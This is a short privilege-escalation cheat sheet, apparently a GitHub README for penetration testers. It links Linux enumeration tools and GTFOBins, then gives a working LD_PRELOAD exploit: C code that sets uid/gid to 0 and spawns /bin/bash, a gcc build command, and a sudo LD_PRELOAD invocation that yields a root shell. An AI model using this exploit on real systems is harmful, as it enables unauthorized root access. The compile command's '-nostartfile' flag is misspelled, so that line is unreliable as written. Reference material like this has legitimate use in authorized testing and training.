# Privilege-Escalation
Bypass security restrictions in misconfigured systems.
List of Tools and Repositories 👇🏻

## For Linux

**LinPeas** - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

**LinEnum** - https://github.com/rebootuser/LinEnum

**LES (Linux Exploit Suggester)** - https://github.com/mzet-/linux-exploit-suggester

**Linux Smart Enumeration** - https://github.com/diego-treitos/linux-smart-enumeration

**Linux Priv Checker** - https://github.com/linted/linuxprivchecker 

**GTFOBins** - https://gtfobins.github.io/

**Using *LD_Preload***
> This piece of code will spawn root shell
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
> Compile it using GCC into a Shared Object file(.so)
```
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```
> Run it by using LD_Preload option  
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
